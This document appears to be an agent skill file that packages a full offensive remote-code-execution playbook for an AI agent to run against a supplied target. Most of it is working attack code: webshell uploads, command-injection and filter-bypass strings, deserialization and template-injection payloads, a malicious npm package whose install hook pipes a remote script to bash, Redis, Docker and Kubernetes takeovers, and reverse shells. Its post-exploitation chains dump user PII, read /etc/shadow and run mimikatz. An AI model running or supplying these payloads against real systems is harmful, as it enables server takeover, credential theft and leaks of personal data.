---
name: rce-deep-dive
description: Complete Remote Code Execution methodology from 331 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - rce methodology
  - rce deep dive
  - remote code execution complete
  - rce all techniques
  - skills rce
---

# Complete RCE Methodology - From 331 HackerOne Reports

## Step 1: Recon for RCE Attack Surface
Map every feature that handles user input in unsafe ways.

### Automated Surface Discovery
```bash
# Find file upload endpoints
grep -E '(upload|file|import|attach|image|avatar|document|pdf|photo|picture|media|resume|csv|excel|import|export|backup|restore|config|settings|theme|template|plugin|extension|module|package|update|install|migrate|deploy|exec|run|cmd|command|shell|bash|terminal|ssh|telnet|ping|traceroute|nslookup|dig|curl|wget|fetch|request|api|proxy|gateway|socket|websocket|stream|process|spawn|fork|eval|exec|system|popen|passthru|shell_exec|backtick|include|require|import|file_get_contents|file_put_contents|unserialize|deserialize|yaml|xml|xsl|xslt|template|twig|smarty|mustache|handlebars|velocity|freemarker|jade|pug|nunjucks|jython|groovy|beanshell|expression|el|ognl|mvel|spel)' recon/{target}/urls.txt | sort -u

# Use gobuster/dirbuster for admin panels
gobuster dir -u https://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,aspx,jsp,py,pl,cgi

# Find exposed services
nmap -sV -p 22,80,443,8080,8443,3000,5000,8000,9000,9200,15672,2375,10250,6443 {target}
```

### Check Every Feature Type
For each feature below, test ALL input vectors:

| Feature | Real Report Example |
|---------|-------------------|
| File upload | #1409896 - Shopify H1514 RCE |
| Command injection | #1132814 - Twitter VPN pre-auth RCE |
| Deserialization | #131227 - Uber Java RCE |
| Dependency confusion | #130815 - PayPal npm misconfig |
| SSTI | #1689514 - Uber Template RCE |
| SSRF → RCE | #713900 - QIWI SSO chain |
| XXE → RCE | #1689514 - Uber XXE RCE |
| ImageMagick | #135122 - ImageMagick RCE |
| Docker API | #366638 - Uber Portainer RCE |
| npm/yarn/pip | #130815 - PayPal dependency confusion |
| JNDI injection | #1464304 - Log4j RCE |
| Prototype pollution | Multiple Node.js reports |
| Buffer overflow | #115000 - Steam Client RCE |
| Insecure deserialization | #1150876 - PayPal Java RCE |
| Server-side template | #1689514 - Uber SSTI RCE |
| File write via path traversal | Multiple reports |
| ZIP symlink | Various archive extraction RCE |
| CSV injection | Multiple reports |
| WebSocket | #2203188 - WebSocket RCE |
| GraphQL mutations | Multiple reports |

## Step 2: File Upload → RCE

### Recon for Upload Features
```bash
# Common upload paths
for path in /upload /file/upload /api/upload /media/upload /image/upload /avatar /profile/picture /import /import/csv /import/xml /import/excel /backup /restore /config /settings /theme /template /plugin /extension; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}$path")
  echo "$path => $code"
done
```

### Upload Vector Testing
```bash
# Direct PHP webshell
curl -sk -F "file=@shell.php" "https://{target}/upload"

# Renamed extension
curl -sk -F "file=@shell.php5" "https://{target}/upload"
curl -sk -F "file=@shell.phtml" "https://{target}/upload"
curl -sk -F "file=@shell.php7" "https://{target}/upload"
curl -sk -F "file=@shell.pht" "https://{target}/upload"
curl -sk -F "file=@shell.shtml" "https://{target}/upload"
curl -sk -F "file=@shell.cgi" "https://{target}/upload"
curl -sk -F "file=@shell.asp" "https://{target}/upload"
curl -sk -F "file=@shell.aspx" "https://{target}/upload"
curl -sk -F "file=@shell.jsp" "https://{target}/upload"
curl -sk -F "file=@shell.jspx" "https://{target}/upload"
curl -sk -F "file=@shell.war" "https://{target}/upload"

# Double extension
curl -sk -F "file=@shell.jpg.php" "https://{target}/upload"
curl -sk -F "file=@shell.php.jpg" "https://{target}/upload"
curl -sk -F "file=@shell.php%00.jpg" "https://{target}/upload"

# Content-Type manipulation
curl -sk -F "file=@shell.php;type=image/jpeg" "https://{target}/upload"

# Polyglot (valid image + PHP)
# Create using exiftool or manual injection
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg -o shell.jpg
curl -sk -F "file=@shell.jpg" "https://{target}/upload"
# Then access: https://target/uploads/shell.jpg?c=id
# Only works if PHP executes in .jpg files (rare but happens)

# .htaccess override
curl -sk -F "file=@.htaccess" -F "content=AddType application/x-httpd-php .txt" "https://{target}/upload"
curl -sk -F "file=@shell.txt" "https://{target}/upload"

# web.config (IIS)
# XML content that allows execution
curl -sk -F "file=@web.config" "https://{target}/upload"
```

### ImageMagick / Ghostscript RCE
```bash
# Create malicious SVG
cat > exploit.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="100" height="100">
  <image href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiBmaWxsPSJyZWQiLz48L3N2Zz4="/>
  <text x="10" y="20">&xxe;</text>
</svg>
EOF

# MSL (Magick Scripting Language) RCE
cat > rce.msl << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<msl:msl xmlns:msl="http://www.imagemagick.org/msl">
  <msl:cd>
    <msl:echo>/var/www/html/</msl:echo>
  </msl:cd>
  <msl:write filename="shell.php">
    <msl:echo><![CDATA[<?php system($_GET["c"]); ?>]]></msl:echo>
  </msl:write>
</msl:msl>
EOF

# Upload MSL file and trigger via ImageMagick
curl -sk -F "file=@rce.msl" "https://{target}/upload"
curl -sk -F "file=@exploit.svg" "https://{target}/upload?image=shell.php"

# ImageTragick (CVE-2016-3714)
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 1 1
affile '/etc/passwd' 'output.txt'
pop graphic-context
EOF
```

## Step 3: Command Injection

### Parameter-Based Command Injection
```bash
# Basic test vectors
curl -sk "https://{target}/ping?host=127.0.0.1;id"
curl -sk "https://{target}/ping?host=127.0.0.1|id"
curl -sk "https://{target}/ping?host=127.0.0.1`id`"
curl -sk "https://{target}/ping?host=127.0.0.1$(id)"
curl -sk "https://{target}/ping?host=127.0.0.1%0aid"
curl -sk "https://{target}/ping?host=127.0.0.1&id"
curl -sk "https://{target}/ping?host=127.0.0.1||id"
curl -sk "https://{target}/ping?host=127.0.0.1&&id"
curl -sk "https://{target}/ping?host=127.0.0.1%0a%0aid"
curl -sk "https://{target}/ping?host=127.0.0.1%0d%0aid"

# Blind command injection (OOB)
curl -sk "https://{target}/ping?host=127.0.0.1;curl http://YOUR-ID.oastify.com/$(whoami)"
curl -sk "https://{target}/ping?host=127.0.0.1;nslookup $(hostname).YOUR-ID.interactsh.com"
curl -sk "https://{target}/ping?host=127.0.0.1;wget --post-data=$(cat /etc/passwd) http://YOUR-IP:4444/"
```

### Header-Based Command Injection
```bash
# User-Agent injection
curl -sk -H "User-Agent: () { :; }; /bin/bash -c 'id'" "https://{target}/cgi-bin/test.cgi"

# X-Forwarded-For injection
curl -sk -H "X-Forwarded-For: 127.0.0.1;id" "https://{target}/admin"

# Referer injection
curl -sk -H "Referer: http://evil.com/$(id)" "https://{target}/page"

# Cookie injection
curl -sk -b "session=test`id`" "https://{target}/dashboard"
```

### WAF Bypass for Command Injection
```bash
# Space bypass
curl -sk "https://{target}/ping?host=127.0.0.1;{id,}"
curl -sk "https://{target}/ping?host=127.0.0.1;id%09"
curl -sk "https://{target}/ping?host=127.0.0.1;id$IFS"
curl -sk "https://{target}/ping?host=127.0.0.1;id<<<"

# Blacklist bypass for 'cat'
curl -sk "https://{target}/ping?host=127.0.0.1;c''at /etc/passwd"
curl -sk "https://{target}/ping?host=127.0.0.1;c$@at /etc/passwd"
curl -sk "https://{target}/ping?host=127.0.0.1;c$a$@t /etc/passwd"
curl -sk "https://{target}/ping?host=127.0.0.1;ca$*t /etc/passwd"
curl -sk "https://{target}/ping?host=127.0.0.1;ca\\t /etc/passwd"
curl -sk "https://{target}/ping?host=127.0.0.1;/${UUID:0:0}cat /etc/passwd"
curl -sk "https://{target}/ping?host=127.0.0.1;/c''/bi''n/c''at /etc/passwd"

# Hex encoding
curl -sk "https://{target}/ping?host=127.0.0.1;$(printf '\x63\x61\x74') /etc/passwd"
curl -sk "https://{target}/ping?host=127.0.0.1;$'\x63\x61\x74' /etc/passwd"

# Base64 encoding
curl -sk "https://{target}/ping?host=127.0.0.1;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh"

# Wildcard tricks
curl -sk "https://{target}/ping?host=127.0.0.1;/???/c?t /???/p?ss??"
curl -sk "https://{target}/ping?host=127.0.0.1;/???/???/c?t /???/p?ss??"
```

## Step 4: Insecure Deserialization → RCE

### PHP Deserialization
```bash
# Generate PHP payload with phpggc
phpggc -f gadget_chain -p 'system(id)' -j

# Standard PHP serialized payload
O:10:"ExampleClass":2:{
  s:4:"name";s:5:"admin";
  s:3:"cmd";s:2:"id";
}

# PHP Phar deserialization (upload .phar file)
# phar:// wrapper triggers deserialization of metadata
phpggc -f gadget_chain -p 'system("id")' -o exploit.phar
curl -sk -F "file=@exploit.phar" "https://{target}/upload"
curl -sk "https://{target}/upload?file=phar://./uploads/exploit.phar/test"
```

### Java Deserialization
```bash
# ysoserial payload generation
java -jar ysoserial.jar CommonsCollections1 'curl http://YOUR-ID.oastify.com/$(id)' > payload.bin
java -jar ysoserial.jar CommonsCollections2 'wget --post-file=/etc/passwd http://YOUR-IP:4444/' > payload2.bin
java -jar ysoserial.jar CommonsCollections3 'nslookup $(hostname).YOUR-ID.interactsh.com' > payload3.bin
java -jar ysoserial.jar CommonsCollections4 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSLUlQLzQ0NDQgMD4mMSc=}|{base64,-d}|{bash,-i}' > payload4.bin
java -jar ysoserial.jar Spring1 'ping -c 10 YOUR-ID.oastify.com' > payload5.bin
java -jar ysoserial.jar Jdk7u21 'id' > payload6.bin

# Test via cookie, parameter, or POST body
curl -sk -b "session=$(cat payload.bin | base64 -w0)" "https://{target}/"
curl -sk -d "$(cat payload.bin | base64 -w0)" "https://{target}/api/data"

# Java Shiro rememberMe deserialization
python3 shiro_exploit.py -u https://{target}/ -k kPH+bIxk5D2deZiIxcaaaA== -c "id"
```

### Python Deserialization
```bash
# Pickle payload
python3 -c "
import pickle, os, base64
class RCE(object):
    def __reduce__(self):
        return (os.system, ('curl http://YOUR-ID.oastify.com/\$(id)',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
" > payload.b64

# Flask session deserialization
python3 flask-unsign --sign --cookie "{'__proto__': {'admin': True}}" --secret 'SECRET_KEY'

# YAML deserialization
# PyYAML with !python/object trigger
cat > exploit.yaml << 'EOF'
!!python/object/apply:os.system ["curl http://YOUR-ID.oastify.com/$(id)"]
EOF
curl -sk -F "file=@exploit.yaml" "https://{target}/upload"

# ruamel.yaml / PyYAML unsafe load
curl -sk -X POST "https://{target}/api/config" \
  -H "Content-Type: application/x-yaml" \
  -d '!!python/object/apply:subprocess.check_output ["id"]'
```

### Ruby Deserialization
```bash
# Marshal.load payload
ruby -e '
class RCE
  def initialize(cmd)
    @cmd = cmd
  end
  def to_s
    `#{@cmd}`
  end
end
Marshal.dump(RCE.new("curl http://YOUR-IP:4444/$(id)"))
' > payload.marsh

# YAML deserialization (Ruby)
curl -sk -X POST "https://{target}/api/config" \
  -H "Content-Type: application/x-yaml" \
  -d '--- !ruby/object:RCE { cmd: "curl http://YOUR-IP:4444/$(id)" }'
```

### .NET Deserialization
```bash
# ysoserial.net
ysoserial.exe -o base64 -g TypeConfuseDelegate -f BinaryFormatter -c "curl http://YOUR-ID.oastify.com/$(whoami)" > payload.b64

# ViewState deserialization
# Tool: ysoserial.net -p ViewState
# Requires MAC validation key if known
```

## Step 5: Server-Side Template Injection (SSTI)

### Template Detection
```bash
# SSTI probe for various engines
curl -sk "https://{target}/page?name={{7*7}}"
curl -sk "https://{target}/page?name=${7*7}"
curl -sk "https://{target}/page?name=#{7*7}"
curl -sk "https://{target}/page?name=*{7*7}"
curl -sk "https://{target}/page?name=<%=7*7%>"
curl -sk "https://{target}/page?name=${{7*7}}"

# Expected response: 49 instead of {{7*7}}
```

### Template Engine-Specific Payloads
```bash
# Jinja2 (Python)
curl -sk "https://{target}/page?name={{config}}"
curl -sk "https://{target}/page?name={{''.__class__.__mro__[2].__subclasses__()}}"
curl -sk "https://{target}/page?name={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
curl -sk "https://{target}/page?name={{''.__class__.__mro__[2].__subclasses__()[40]('/proc/self/environ').read()}}"

# Jinja2 RCE
curl -sk "https://{target}/page?name={{''.__class__.__mro__[2].__subclasses__()[X](['ls','-la'],stdout=-1).communicate()}}"
curl -sk "https://{target}/page?name={{''.__class__.__mro__[2].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}"

# Find correct subclass index for Popen
for i in $(seq 0 300); do
  result=$(curl -sk "https://{target}/page?name={{''.__class__.__mro__[2].__subclasses__()[$i].__name__}}" 2>/dev/null)
  if echo "$result" | grep -q "Popen"; then
    echo "Popen at index $i"
  fi
done

# Jinja2 to RCE (compact)
curl -sk "https://{target}/page?name={{lipsum.__globals__['os'].popen('id').read()}}"
curl -sk "https://{target}/page?name={{cycler.__init__.__globals__.os.popen('id').read()}}"
curl -sk "https://{target}/page?name={{joiner.__init__.__globals__.os.popen('id').read()}}"
curl -sk "https://{target}/page?name={{namespace.__init__.__globals__.os.popen('id').read()}}"
curl -sk "https://{target}/page?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# Freemarker (Java)
curl -sk "https://{target}/page?name=<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
curl -sk "https://{target}/page?name=${'freemarker.template.utility.Execute'?new()('id')}"
curl -sk "https://{target}/page?name=<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}"

# Velocity (Java)
curl -sk "https://{target}/page?name=%23set($x=%27%27)%20%23set($rt=$x.class.forName(%27java.lang.Runtime%27))%20%23set($chr=$x.class.forName(%27java.lang.Character%27))%20%23set($str=$x.class.forName(%27java.lang.String%27))%20%23set($ex=$rt.getRuntime().exec(%27id%27))%20$ex.waitFor()%20#set($out=$ex.getInputStream())%20#foreach($i%20in%20[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

# Twig (PHP)
curl -sk "https://{target}/page?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
curl -sk "https://{target}/page?name={{['id']|filter('system')}}"

# Smarty (PHP)
curl -sk "https://{target}/page?name={system('id')}"
curl -sk "https://{target}/page?name={php}echo shell_exec('id');{/php}"

# ERB (Ruby)
curl -sk "https://{target}/page?name=<%= system('id') %>"
curl -sk "https://{target}/page?name=<%= %x(id) %>"

# Jade/Pug
curl -sk "https://{target}/page?name=#{global.process.mainModule.require('child_process').execSync('id')}"

# Nunjucks
curl -sk "https://{target}/page?name={{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}"

# Handlebars
curl -sk "https://{target}/page?name={{#with 's' as |string|}}{{#with 'e'}}{{{this}}}{{/with}}{{/with}}"
curl -sk "https://{target}/page?name={{#with (lookup this 'constructor')}}{{#with (lookup (lookup this 'constructor') 'constructor')}}{{this}}{{'return require(\"child_process\").execSync(\"id\")'}}{{/with}}{{/with}}"
```

## Step 6: Dependency Confusion / Supply Chain

### Dependency Confusion Testing
```bash
# Test for private package names that could be usurped

# npm - check if private package exists on public registry
npm view @target/private-package  # Should return 404 if not public
npm view target-internal-lib      # If public exists, check version

# pip - check PyPI
pip install target-internal-package==  # Will error if doesn't exist

# Ruby gems
gem search target-internal-gem --remote

# Maven/Gradle
# Check search.maven.org for private groupId:artifactId

# Exploit steps for npm
# 1. Create package.json with higher version number
# 2. Publish to npm registry
npm publish ./malicious-package

# Payload for dependency confusion
# package.json
{
  "name": "@target/internal-lib",
  "version": "999.999.999",
  "main": "index.js",
  "scripts": {
    "preinstall": "curl http://YOUR-ID.oastify.com/$(whoami)",
    "postinstall": "node -e 'require(\"child_process\").execSync(\"curl http://YOUR-IP:4444/shell.sh | bash\")'"
  },
  "dependencies": {}
}
```

## Step 7: SSRF/XXE Chain to RCE

### SSRF → Redis → RCE
```bash
# Step 1: Find SSRF parameter
curl -sk "https://{target}/page?url=http://127.0.0.1:6379/"

# Step 2: Create gopher payload for Redis
# Write SSH key to authorized_keys
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0d%0a%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDP...%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$20%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$18%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# Write PHP webshell via Redis
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0ashell%0d%0a$24%0d%0a<?php system($_GET['c']);?>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# Step 3: Access webshell
curl -sk "https://{target}/shell.php?c=id"
```

### SSRF → Kubernetes API → Pod RCE
```bash
# Step 1: Access kubelet API
curl -sk "https://{target}/ssrf?url=http://localhost:10250/pods"

# Step 2: Create a malicious pod
curl -sk "https://{target}/ssrf?url=http://localhost:10250/run/namespace/pod/container" \
  -X POST \
  -d "cmd=id"

# Step 3: Access Kubernetes dashboard for full cluster access
curl -sk "https://{target}/ssrf?url=http://localhost:8001/api/v1/namespaces/kube-system/secrets/"
```

### XXE → RCE
```bash
# XXE with PHP expect module
cat > xxe_rce.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
EOF
curl -sk -X POST -H "Content-Type: application/xml" -d @xxe_rce.xml "https://{target}/api"

# XXE with SSRF to internal service
cat > xxe_ssrf.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:2375/containers/json">
]>
<root>&xxe;</root>
EOF

# XXE to read SSH keys
cat > xxe_ssh.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
]>
<root>&xxe;</root>
EOF

# XXE via SVG upload
cat > xxe_svg.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<svg>&xxe;</svg>
EOF

# XXE OOB exfiltration (blind)
cat > xxe_oob.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-IP:4444/evil.dtd">
  %dtd;
]>
<root>&send;</root>
EOF

# On your server, serve evil.dtd:
# <!ENTITY send SYSTEM "http://YOUR-IP:4444/?file=%file;">
```

## Step 8: Cloud RCE Attack Vectors

### Docker API RCE
```bash
# Step 1: Check if Docker API is exposed
curl -sk "https://{target}/ssrf?url=http://localhost:2375/version"
curl -sk "https://{target}/ssrf?url=http://localhost:2375/containers/json"

# Step 2: Create privileged container with host mount
curl -sk -X POST "https://{target}/ssrf?url=http://localhost:2375/containers/create" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "ubuntu:latest",
    "Cmd": ["/bin/bash", "-c", "apt update && apt install -y openssh-server && /usr/sbin/sshd -D"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/hostfs"],
      "PortBindings": {"22/tcp": [{"HostPort": "2222"}]}
    }
  }'

# Step 3: Start the container
curl -sk -X POST "https://{target}/ssrf?url=http://localhost:2375/containers/CONTAINER_ID/start"

# Step 4: SSH into container and access host filesystem at /hostfs
```

### Kubernetes RCE
```bash
# Step 1: Check kubelet API
curl -sk -k "https://{target}:10250/pods"
curl -sk -k "https://{target}:10250/run/namespace/pod/container" -X POST -d "cmd=id"

# Step 2: Check API server
curl -sk -k "https://{target}:6443/api/v1/namespaces/default/secrets/"

# Step 3: Create malicious pod (if authenticated)
cat > malicious-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  containers:
  - name: attacker
    image: ubuntu:latest
    command: ["/bin/bash", "-c", "apt update && apt install -y curl && curl http://YOUR-IP:4444/shell.sh | bash"]
    volumeMounts:
    - name: hostfs
      mountPath: /host
  volumes:
  - name: hostfs
    hostPath:
      path: /
      type: Directory
  serviceAccountName: cluster-admin
  automountServiceAccountToken: true
EOF

kubectl apply -f malicious-pod.yaml

# Step 4: Use service account token for full cluster admin
kubectl get secrets --all-namespaces
kubectl get pods --all-namespaces
kubectl exec -it attacker-pod -- chroot /host /bin/bash
```

### AWS Lambda RCE
```bash
# Step 1: Check for exposed Lambda endpoints
# Lambda function URLs or API Gateway endpoints

# Step 2: If Lambda has SSRF, access metadata
curl -sk "https://{target}/ssrf?url=http://169.254.169.254/latest/meta-data/"

# Step 3: Access Lambda runtime API
curl -sk "https://{target}/ssrf?url=http://localhost:9001/2018-06-01/runtime/invocation/next"

# Step 4: Try to read /proc/self/environ or /tmp for env vars
curl -sk "https://{target}/ssrf?url=file:///proc/self/environ"
curl -sk "https://{target}/ssrf?url=file:///tmp/.aws/credentials"
```

### Cloud Provider Service Abuse
```bash
# AWS ECS Anywhere / SSM
curl -sk "https://{target}/ssrf?url=http://localhost:51678/v1/metadata"
curl -sk "https://{target}/ssrf?url=http://localhost:51678/v1/tasks"

# GCP Cloud Run / App Engine
curl -sk -H "Metadata-Flavor: Google" "https://{target}/ssrf?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure App Services
curl -sk "https://{target}/ssrf?url=http://127.0.0.1:8080/api/v1/identity/oauth2/token"
```

## Step 9: Log4j / JNDI Injection RCE

### Log4j Detection
```bash
# Basic Log4j probe
curl -sk "https://{target}/page?name=\${jndi:ldap://YOUR-ID.oastify.com/a}"
curl -sk -H "User-Agent: \${jndi:ldap://YOUR-ID.oastify.com/a}" "https://{target}/"
curl -sk -H "X-Forwarded-For: \${jndi:ldap://YOUR-ID.oastify.com/a}" "https://{target}/"
curl -sk -b "session=\${jndi:ldap://YOUR-ID.oastify.com/a}" "https://{target}/dashboard"
curl -sk "https://{target}/api/search?q=\${jndi:ldap://YOUR-ID.oastify.com/a}"

# WAF bypass for ${}
curl -sk "https://{target}/page?name=\${jndi:ldap://YOUR-ID.oastify.com/a}"
curl -sk "https://{target}/page?name=\${jndi:ldap://YOUR-ID.oastify.com/a}"
curl -sk "https://{target}/page?name=\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://YOUR-ID.oastify.com/a"
curl -sk "https://{target}/page?name=\${lower:j}\${lower:n}\${lower:d}i:\${lower:l}\${lower:d}ap://YOUR-ID.oastify.com/a"
curl -sk "https://{target}/page?name=\${env:FOO:-j}ndi:ldap://YOUR-ID.oastify.com/a"
```

## Step 10: RCE Exploit Chains

### Chain 1: RCE → PII Access → Privilege Escalation
```bash
# Step 1: Initial foothold via file upload RCE
curl -sk "https://{target}/shell.php?c=id"
# www-data / apache / nobody

# Step 2: Extract database credentials
curl -sk "https://{target}/shell.php?c=cat+/var/www/html/config.php"
curl -sk "https://{target}/shell.php?c=cat+/var/www/.env"
curl -sk "https://{target}/shell.php?c=find+/var+-type+f+-name+*.env"
curl -sk "https://{target}/shell.php?c=cat+/proc/1/environ"

# Step 3: Dump database for PII
curl -sk "https://{target}/shell.php?c=mysql+-h+localhost+-u+root+-pPASSWORD+db+-e+'SELECT+email,password,ssn,credit_card+FROM+users+'"

# Step 4: Attempt privilege escalation
curl -sk "https://{target}/shell.php?c=sudo+-l"
curl -sk "https://{target}/shell.php?c=find+/+-perm+-4000+-type+f+2>/dev/null"
curl -sk "https://{target}/shell.php?c=cat+/etc/crontab"
curl -sk "https://{target}/shell.php?c=ls+-la+/home/*/.ssh/"
curl -sk "https://{target}/shell.php?c=cat+/etc/shadow"
```

### Chain 2: SSRF → Metadata → Cloud Keys → RCE
```bash
# Step 1: SSRF to AWS metadata
curl -sk "https://{target}/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName"

# Step 2: Use keys to access AWS console/CLI
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Step 3: Create EC2 instance with user-data script
aws ec2 run-instances \
  --image-id ami-... \
  --instance-type t2.micro \
  --user-data '#!/bin/bash
    bash -i >& /dev/tcp/YOUR-IP/4444 0>&1' \
  --security-group-ids sg-...
```

### Chain 3: Deserialization → Lateral Movement → Domain Admin
```bash
# Step 1: Java deserialization on app server
java -jar ysoserial.jar CommonsCollections1 'wget http://YOUR-IP:4444/mimikatz.exe -O C:\temp\mimikatz.exe' > payload.bin
curl -sk -b "session=$(base64 -w0 payload.bin)" "https://{target}/dashboard"

# Step 2: Extract credentials from memory
curl -sk "https://{target}/shell.php?c=C:\\temp\\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"

# Step 3: Use extracted credentials to move laterally
# Pass-the-hash or use plaintext to access other machines
psexec \\\\DC-SERVER -u DOMAIN\\admin -p PASSWORD cmd
```

### Chain 4: SSTI → RCE → Internal Network Pivot
```bash
# Step 1: Jinja2 SSTI RCE
curl -sk "https://{target}/page?name={{lipsum.__globals__['os'].popen('python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\"').read()}}"

# Step 2: Establish reverse shell
curl -sk "https://{target}/page?name={{lipsum.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/YOUR-IP/4444 0>&1\"').read()}}"

# Step 3: Pivot to internal network
# From reverse shell: scan internal network
curl -sk "https://{target}/page?name={{lipsum.__globals__['os'].popen('nmap -sn 10.0.0.0/24').read()}}"
```

## Step 11: Validate & Report

### CVSS Scoring for RCE
```
Unauthenticated RCE:                 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Authenticated RCE (low-priv):        AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H → 8.8 High
RCE via file upload:                 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
RCE via SSTI:                        AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
RCE via deserialization:             AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Dependency confusion RCE:            AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H → 8.1 High
RCE in cloud environment:            AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0 Critical
```

### Report Template
```markdown
**Summary:**
Remote Code Execution via [vector] at [endpoint] allows an attacker to execute 
arbitrary commands on the [application/server/container].

**Impact:**
An attacker can exploit this to [execute system commands / read sensitive files / 
access internal networks / steal cloud credentials / achieve full server takeover].

**Steps to Reproduce:**
1. Send request to: [request]
2. Observe: [evidence of RCE]

**Proof of Concept:**
Request:
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
--boundary--

Response: File uploaded to /uploads/shell.php

Command execution:
GET /uploads/shell.php?c=id HTTP/1.1
Host: target.com

Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)

**Suggested Fix:**
1. Never trust user input - validate, sanitize, and restrict file types
2. Use parameterized queries and prepared statements
3. Disable dangerous PHP functions (system, exec, shell_exec, passthru, eval)
4. Use a sandboxed environment for code execution
5. Implement proper access controls and authentication
6. Regular security audits and dependency scanning
```

## RCE Automation Script
```bash
#!/bin/bash
# Full RCE scan for a target
TARGET=$1
UPLOAD_ENDPOINTS="/upload /file/upload /api/upload /media/upload /image/upload /avatar /profile/picture /import /import/csv /import/xml /backup /restore /config /settings"

echo "[*] Checking upload endpoints..."
for endpoint in $UPLOAD_ENDPOINTS; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$endpoint" -X POST 2>/dev/null)
  if [ "$code" != "000" ] && [ "$code" != "405" ] && [ "$code" != "404" ]; then
    echo "[+] Upload endpoint found: $endpoint (HTTP $code)"
  fi
done

echo "[*] Checking SSTI parameters..."
PARAMS="name user username search q term"
for param in $PARAMS; do
  result=$(curl -sk "https://$TARGET/page?$param={{7*7}}" 2>/dev/null)
  if echo "$result" | grep -q "49"; then
    echo "[+] SSTI: $param returned 49 in template"
  fi
done

echo "[*] Checking command injection on common params..."
for param in "host" "domain" "ip" "url" "target" "server"; do
  result=$(curl -sk "https://$TARGET/ping?$param=127.0.0.1;echo%20INJECTED" 2>/dev/null)
  if echo "$result" | grep -q "INJECTED"; then
    echo "[+] CMDi: $param shows injection echo"
  fi
done

echo "[*] Checking Log4j..."
curl -sk -H "User-Agent: \${jndi:ldap://YOUR-ID.oastify.com/test}" "https://$TARGET/" -o /dev/null -w "Tested Log4j via User-Agent\n"

echo "[*] Scan complete"
```

## Additional Techniques (External Sources)

